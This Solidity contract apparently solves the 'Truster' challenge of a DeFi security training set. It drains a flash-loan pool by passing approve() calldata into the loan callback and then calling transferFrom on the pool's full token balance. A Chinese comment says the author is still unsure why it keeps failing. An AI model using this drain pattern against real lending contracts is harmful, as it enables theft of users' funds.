// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface IPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

contract TrusterExploit {

    //原本想用合約寫, 但不知道為什麼一直有問題, 還在找
    function attack(address pool, address token, uint256 tokenInPool) public {
        IPool iPool = IPool(pool);
        IERC20 erc20Token = IERC20(token);

        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), tokenInPool);
        
        iPool.flashLoan(0, address(this), address(erc20Token), data);

        erc20Token.transferFrom(address(iPool), msg.sender, erc20Token.balanceOf(address(iPool)));
    }
}
